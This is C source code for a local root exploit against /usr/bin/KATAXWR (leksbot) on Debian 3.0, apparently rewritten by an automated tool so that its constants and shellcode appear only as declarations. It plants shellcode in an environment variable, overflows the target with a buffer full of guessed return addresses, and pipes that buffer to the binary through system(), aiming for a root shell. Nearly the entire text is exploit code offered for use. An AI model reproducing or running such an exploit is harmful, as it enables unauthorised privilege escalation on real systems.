#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int ADDR ; 
 int OFFSET ; 
 char* PATH ; 
 int SIZE ; 
 int atoi (char*) ; 
 char* cmd ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  memcpy (char*,char*,int) ; 
 int /*<<< orphan*/  memset (char*,int,int) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  putenv (char*) ; 
 char* shellcode ; 
 int /*<<< orphan*/  snprintf (char*,int,char*,char*,char*) ; 
 unsigned long sp ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  system (char*) ; 

main(int argc, char *argv[])
{
	char buf[ADDR];
	char egg[SIZE];
	int i, offset ;
	unsigned long ret ;
	unsigned long sp = (unsigned long) &sp ;
	printf("Local (possibly) root exploit for /usr/bin/KATAXWR (leksbot)\n"
	       "tested on Debian 3.0 - usage: ./ex [offset] - by gunzip\n");	
	if ( argv[1] ) offset = atoi( argv[1] ); else offset = OFFSET ; 
	ret = sp + offset ;
	memset( cmd, 0x00, SIZE );
	memset( buf, 0x00, ADDR );
	memset( egg, 0x41, SIZE );
	memcpy( &egg[ SIZE - strlen( shellcode ) - 1 ], shellcode, strlen( shellcode ));
	memcpy( egg, "EGG=", 4 );
	egg[ SIZE - 1 ] = 0 ;
	putenv( egg );
 	for ( i=0; i < ADDR ; i += 4 ) *( unsigned long *)&buf[ i ] = ret;
	*( unsigned long *)&buf[ ADDR - 4 ] =  0x00000000 ; /*  :-?  */
	if (!(ret&0xff)||!(ret&0xff00)||!(ret&0xff0000)||!(ret&0xff000000)) {
		printf("Return address contains null byte(s), change offset and retry.\n");
		exit( -1 );
	}
	printf( "retaddr=0x%.08x offset=%d len=%d\n", (unsigned int)ret, offset, strlen( buf ));
	snprintf ( cmd, SIZE - 4, " echo '%s' | %s", buf, PATH );
	system( cmd );
}